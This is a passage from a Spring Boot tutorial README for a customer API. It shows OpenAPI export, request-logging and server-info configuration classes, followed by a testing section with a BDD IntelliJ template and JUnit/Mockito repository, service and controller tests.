- Saves the documentation to a specified file in the project root. The output file name is specified in the
  `application.yaml` file.
- Handles both HTTP and HTTPS protocols based on the server configuration.

<details>
  <summary>View OpenApiConfig code</summary>

```java
package com.ainigma100.customerapi.config;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import io.swagger.v3.oas.annotations.OpenAPIDefinition;
import io.swagger.v3.oas.annotations.info.Info;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.web.client.RestClient;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@Slf4j
@Configuration
@OpenAPIDefinition(info = @Info(
        title = ""${springdoc.title}"",
        version = ""${springdoc.version}"",
        description = ""Documentation ${spring.application.name} v1.0""
))
public class OpenApiConfig {


    private final Environment environment;

    public OpenApiConfig(Environment environment) {
        this.environment = environment;
    }

    @Value(""${server.port:8080}"")
    private int serverPort;

    @Value(""${openapi.output.file}"")
    private String outputFileName;

    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";

    @Bean
    public CommandLineRunner generateOpenApiJson() {
        return args -> {
            String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
            String host = getServerIP();
            String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");

            // Define the API docs URL
            String apiDocsUrl = String.format(""%s://%s:%d%s/v3/api-docs"", protocol, host, serverPort, contextPath);

            log.info(""Attempting to fetch OpenAPI docs from URL: {}"", apiDocsUrl);

            try {
                // Create RestClient instance
                RestClient restClient = RestClient.create();

                // Fetch the OpenAPI JSON
                String response = restClient.get()
                        .uri(apiDocsUrl)
                        .retrieve()
                        .body(String.class);

                // Format and save the JSON to a file
                formatAndSaveToFile(response, outputFileName);

                log.info(""OpenAPI documentation generated successfully at {}"", outputFileName);

            } catch (Exception e) {
                log.error(""Failed to generate OpenAPI documentation from URL: {}"", apiDocsUrl, e);
            }
        };
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }

    private void formatAndSaveToFile(String content, String fileName) {
        try {
            ObjectMapper objectMapper = new ObjectMapper();

            // Enable pretty-print
            objectMapper.enable(SerializationFeature.INDENT_OUTPUT);

            // Read the JSON content as a JsonNode
            JsonNode jsonNode = objectMapper.readTree(content);

            // Write the formatted JSON to a file
            objectMapper.writeValue(new File(fileName), jsonNode);

        } catch (IOException e) {
            log.error(""Error while saving JSON to file"", e);
        }
    }
}
```

</details>

### LoggingFilter

A servlet filter that logs incoming HTTP requests and outgoing responses. It excludes certain paths, such as those
related to Actuator and Swagger, from logging to reduce noise.

**Key Features**:

- Logs the client's IP address, request URL, and HTTP method.
- Logs the response status after the request is processed.
- Excludes paths related to Actuator, Swagger, and static resources from logging.

<details>
  <summary>View LoggingFilter code</summary>

```java
package com.ainigma100.customerapi.filter;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.io.IOException;

@Component
@Slf4j
public class LoggingFilter implements Filter {


    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpServletRequest = (HttpServletRequest) request;
        HttpServletResponse httpServletResponse = (HttpServletResponse) response;

        String clientIP = this.getClientIP(httpServletRequest);

        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Client IP: {}, Request URL: {}, Method: {}"", clientIP, httpServletRequest.getRequestURL(), httpServletRequest.getMethod());
        }

        // pre methods call stamps
        chain.doFilter(request, response);

        // post method calls stamps
        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Response status: {}"", httpServletResponse.getStatus());
        }

    }

    private boolean shouldLogRequest(HttpServletRequest request) {

        // (?i) enables case-insensitive matching, \b matched as whole words
        // reference: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions
        return !request.getServletPath().matches(""(?i).*\\b(actuator|swagger|api-docs|favicon|ui)\\b.*"");
    }

    private String getClientIP(HttpServletRequest request) {

        String clientIP = request.getHeader(""Client-IP"");

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Forwarded-For"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Real-IP"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getRemoteAddr();
        }

        return clientIP != null ? clientIP : ""Unknown"";
    }

}
```

</details>

### FiltersConfig

This configuration class registers the `LoggingFilter` as a Spring bean and sets its priority in the filter chain.

**Key Features**:

- Registers the `LoggingFilter` with a specified order of execution.
- Ensures that the filter applies to all incoming requests.

<details>
  <summary>View FiltersConfig code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@AllArgsConstructor
@Configuration
public class FiltersConfig {

    private final LoggingFilter loggingFilter;

    @Bean
    public FilterRegistrationBean<LoggingFilter> loggingFilterBean() {

        final FilterRegistrationBean<LoggingFilter> filterBean = new FilterRegistrationBean<>();
        filterBean.setFilter(loggingFilter);
        filterBean.addUrlPatterns(""/*"");
        // Lower values have higher priority
        filterBean.setOrder(Integer.MAX_VALUE - 2);

        return filterBean;
    }

}

```

</details>

### ServerDetails

This component logs important server details when the application starts, including the server's protocol, host, port,
context path, and active profiles. It also provides the URL for accessing the Swagger UI.

**Key Features**:

- Logs server details and Swagger UI access URL on application startup.
- Supports both HTTP and HTTPS protocols.
- Displays the active Spring profiles.

<details>
  <summary>View ServerDetails code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@AllArgsConstructor
@Component
public class ServerDetails {

    private static final Logger log = LoggerFactory.getLogger(ServerDetails.class);


    private final Environment environment;
    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_PORT = ""server.port"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";
    private static final String SPRINGDOC_SWAGGER_UI_PATH = ""springdoc.swagger-ui.path"";
    private static final String DEFAULT_PROFILE = ""default"";

    @EventListener(ApplicationReadyEvent.class)
    public void logServerDetails() {

        String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
        String host = getServerIP();
        String serverPort = Optional.ofNullable(environment.getProperty(SERVER_PORT)).orElse(""8080"");
        String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");
        String[] activeProfiles = Optional.of(environment.getActiveProfiles()).orElse(new String[0]);
        String activeProfile = (activeProfiles.length > 0) ? String.join("","", activeProfiles) : DEFAULT_PROFILE;
        String swaggerUI = Optional.ofNullable(environment.getProperty(SPRINGDOC_SWAGGER_UI_PATH)).orElse(""/swagger-ui/index.html"");

        log.info(
                """"""
                        
                        
                        Access Swagger UI URL: {}://{}:{}{}{}
                        Active Profile: {}
                        """""",
                protocol, host, serverPort, contextPath, swaggerUI,
                activeProfile
        );
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }
}
```

</details>

---

## 11. Testing

Testing is essential to ensure your application works as expected. This section will cover how to effectively test your
Spring Boot application using both unit testing and integration testing strategies, including Behavior Driven
Development (BDD).

### Unit Testing

Unit testing is a method of testing individual units or components of the software in isolation. The main goal is to
validate that each unit of the software performs as expected. A ""unit"" is typically the smallest piece of code that can
be logically isolated, such as a function, method, or class.

### Behavior Driven Development (BDD) Testing

BDD focuses on writing tests that describe the system's behavior from the user's perspective. It helps improve
collaboration between developers, testers, and stakeholders. In Java, you can use JUnit with Mockito to implement BDD.

#### IntelliJ Live Template for BDD

To make writing BDD tests easier in IntelliJ IDEA, you can create a live template that generates a basic structure for
BDD tests. Here’s the template you can use:

```xml

<template name=""bdd""
          value=""@org.junit.jupiter.api.Test&#10;void given$NAME$_when$NAME2$_then$NAME3$() {&#10;&#10;    // given - precondition or setup&#10;    org.mockito.BDDMockito.given().willReturn();&#10;    &#10;    // when - action or behaviour that we are going to test&#10;    &#10;    &#10;    // then - verify the output&#10;&#10;}""
          description=""Behaviour Driven Development (BDD) test template"" toReformat=""false"" toShortenFQNames=""true"">
    <variable name=""NAME"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME2"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME3"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <context>
        <option name=""JAVA_DECLARATION"" value=""true""/>
    </context>
</template>
```

With the above template, when you type `bdd` in your test class, IntelliJ IDEA will generate a skeleton for a BDD-style
test, helping you follow the BDD principles consistently.

In your Spring Boot project, BDD can be implemented as follows:

1. **Given**: Set up the initial context or preconditions for the test.
2. **When**: Perform the action or behavior that you want to test.
3. **Then**: Verify the expected outcome or results.

By structuring your tests this way, you ensure they are clear, concise, and focused on the behavior of the application
from the user’s perspective.

### Testing the Repository Layer

The repository layer is responsible for interacting with the database. When testing this layer, focus on ensuring that
your custom query methods behave as expected. If you are only using the provided methods from `JpaRepository` without
any custom queries, you do not need to test this layer.

- **`@DataJpaTest`**: Configures an in-memory database, automatically rolling back transactions after each test. Ensure
  that you have the H2 dependency in your project for this annotation to work correctly. This annotation also limits the
  loaded beans to those required for JPA tests.

- **`@Autowired`**: Used to inject the repository instance into your test class, allowing you to call repository methods
  directly.

- **`@BeforeEach`**: Indicates that the annotated method should be run before each test method in the class. This is
  commonly used for setting up test data or initializing common objects used in multiple tests.

- **`@Test`**: The most common annotation in JUnit, marking a method as a test method that will be executed when running
  the test suite.

<details>
  <summary>View CustomerRepositoryTest code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;

import java.time.LocalDate;

import static org.junit.jupiter.api.Assertions.*;


/*
 * @DataJpaTest will automatically configure in-memory database for testing
 * and, it will not load annotated beans into the Application Context.
 * It will only load the repository class. Tests annotated with @DataJpaTest
 * are by default transactional and roll back at the end of each test.
 */
@DataJpaTest
class CustomerRepositoryTest {

    @Autowired
    private CustomerRepository customerRepository;

    private Customer customer;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));

    }

    @Test
    void givenValidEmail_whenFindByEmail_thenReturnCustomer() {

        // given - precondition or setup
        String email = ""jwick@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNotNull(customerFromDB);
        assertEquals(customer.getFirstName(), customerFromDB.getFirstName());
        assertEquals(customer.getLastName(), customerFromDB.getLastName());
        assertEquals(customer.getEmail(), customerFromDB.getEmail());
        assertEquals(customer.getPhoneNumber(), customerFromDB.getPhoneNumber());
        assertEquals(customer.getDateOfBirth(), customerFromDB.getDateOfBirth());
    }

    @Test
    void givenInvalidEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = ""abc@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenNullEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = null;
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenEmptyEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = """";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }


}
```

</details>


<br><br>

### Testing the Service Layer

The service layer contains your business logic and interacts with the repository layer. Testing this layer typically
involves mocking the repository to isolate the service logic.

- **`@ExtendWith(MockitoExtension.class)`**: Enables Mockito annotations in your test class.
- **`@InjectMocks`**: Injects the mock objects into the service class, allowing you to test the service logic
  independently of the repository layer. This annotation creates an instance of the class under test and injects the
  mock dependencies annotated with `@Mock` into it.
- **`@Mock`**: Used to create mock instances of the repository or other dependencies.
- **`@DisplayName`**: Allows you to provide a custom name for your test methods, making them more descriptive and
  readable in test reports.

<details>
  <summary>View CustomerServiceImplTest code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.*;

/*
 * @ExtendWith(MockitoExtension.class) informs Mockito that we are using
 * mockito annotations to mock the dependencies
 */
@ExtendWith(MockitoExtension.class)
class CustomerServiceImplTest {

    // @InjectMocks creates the mock object of the class and injects the mocks
    // that are marked with the annotations @Mock into it.
    @InjectMocks
    private CustomerServiceImpl customerService;

    @Mock
    private CustomerRepository customerRepository;

    @Mock
    private CustomerMapper customerMapper;

    private Customer customer;
    private CustomerDTO customerDTO;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
        customer.setId(1L);
        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));
        customer.setCreatedDate(LocalDateTime.now());
        customer.setUpdatedDate(LocalDateTime.now());

        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));
    }


    @Test
    @DisplayName(""Test creating a new customer"")
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.empty());
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.createCustomer(customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findByEmail(email);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test creating a customer with existing email throws ResourceAlreadyExistException"")
    void givenExistingEmail_whenCreateCustomer_thenThrowResourceAlreadyExistException() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.of(customer));

        // when/then - verify that the ResourceAlreadyExistException is thrown
        assertThatThrownBy(() -> customerService.createCustomer(customerDTO))
                .isInstanceOf(ResourceAlreadyExistException.class)
                .hasMessageContaining(""Resource Customer with email : '"" + email + ""' already exist"");


        verify(customerRepository, times(1)).findByEmail(customerDTO.getEmail());
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }

    @Test
    @DisplayName(""Test retrieving a customer by ID"")
    void givenValidId_whenGetCustomerById_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.getCustomerById(id);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getId()).isEqualTo(customerDTO.getId());
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }


    @Test
    @DisplayName(""Test retrieving a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenGetCustomerById_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.getCustomerById(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer by ID"")
    void givenValidIdAndCustomerDTO_whenUpdateCustomer_thenReturnUpdatedCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerDTO_whenUpdateCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomer(id, customerDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer's email by ID"")
    void givenValidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomerEmail(id, customerEmailUpdateDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer's email by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomerEmail(id, customerEmailUpdateDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test deleting a customer by ID"")
    void givenValidId_whenDeleteCustomer_thenDeleteCustomer() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        doNothing().when(customerRepository).delete(customer);

        // when - action or behaviour that we are going to test
        customerService.deleteCustomer(id);

        // then - verify the output
        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).delete(customer);

    }

    @Test
    @DisplayName(""Test deleting a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenDeleteCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.deleteCustomer(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).delete(any(Customer.class));

    }

}
```

</details>



<br><br>

### Testing the Controller Layer

The controller layer is responsible for handling HTTP requests and returning appropriate responses. When testing this
layer, the goal is to ensure that the controller behaves correctly in response to various inputs and interactions with
its dependencies, such as services and mappers.

- **`@WebMvcTest`**: This annotation is used to load only the components required for testing the controller layer. It
  configures Spring’s testing support for MVC applications but does not load the full application context, making tests
  faster and more focused.

- **`@MockBean`**: This annotation is used to create and inject mock instances of the service layer or other
  dependencies that the controller interacts with. Mocking these dependencies ensures that the test focuses solely on
  the behavior of the controller without involving actual business logic or database interactions.

- **`@Autowired`**: This annotation is used to inject the `MockMvc` and `ObjectMapper` beans into your test class.
    - `MockMvc` is used to simulate HTTP requests and test the controller’s response without starting the server.
    - `ObjectMapper` is used for serializing and deserializing JSON objects, making it easier to work with request and
      response bodies in tests.

### Key Points:

1. **Mocking Service and Mapper**:
   - Mock the service and mapper beans to isolate the controller’s logic. By controlling the outputs of the service and
     mapper methods, you can focus your tests on the controller's behavior and ensure that it processes requests and
     responses correctly.

2. **Testing HTTP Methods**:
   - Test different HTTP methods (e.g., GET, POST, PUT, DELETE) to ensure that the controller correctly processes
     requests and returns the expected responses for each type of action.

3. **Argument Matchers**:
   - When setting up mock interactions, use `ArgumentMatchers` like `any(Class.class)` to generalize the input
     parameters, especially when you do not care about the specific value. Alternatively, use specific matchers like
     `eq()` when you want to ensure that the method is called with exact values. Choosing the right matcher depends on
     your test scenario. Understanding when to use each will make your tests more reliable.

4. **Validation of Responses**:
   - Validate the status code, headers, and response body using methods like `andExpect()`. Ensure that the response
     structure and content are what you expect. This step is crucial to verify that your API meets its contract.

5. **Use of `ResultActions`**:
   - Capture the result of the `MockMvc` request using `ResultActions`. This allows you to chain further verifications
     on the response, ensuring that all aspects of the response are as expected.

### Note:

- When writing controller tests, it’s important to decide whether to use `ArgumentMatchers` like `any()` for flexible
  input matching or `eq()` for strict matching based on the context of your test scenario. For more details on using
  argument matchers or `eq()` in Mockito, you can search online resources or refer to Mockito documentation.

<details>
  <summary>View CustomerControllerTest code</summary>

```java
package com.ainigma100.customerapi.controller;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerRequestDTO;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

import java.time.LocalDate;

import static org.hamcrest.CoreMatchers.is;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.BDDMockito.given;
import static org.mockito.BDDMockito.willDoNothing;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;


/*
 * @WebMvcTest annotation will load all the components required
 * to test the Controller layer. It will not load the service or repository layer components
 */
@WebMvcTest(CustomerController.class)
class CustomerControllerTest {

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private CustomerService customerService;

    @MockBean
    private CustomerMapper customerMapper;

    private CustomerRequestDTO customerRequestDTO;
    private CustomerDTO customerDTO;

    @BeforeEach
    void setUp() {

        customerRequestDTO = new CustomerRequestDTO();
        customerRequestDTO.setFirstName(""John"");
        customerRequestDTO.setLastName(""Wick"");
        customerRequestDTO.setEmail(""jwick@tester.com"");
        customerRequestDTO.setPhoneNumber(""0123456789"");
        customerRequestDTO.setDateOfBirth(LocalDate.now().minusYears(18));


        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));

    }


    @Test
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.createCustomer(any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(post(""/api/v1/customers"")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isCreated())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenGetCustomerById_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
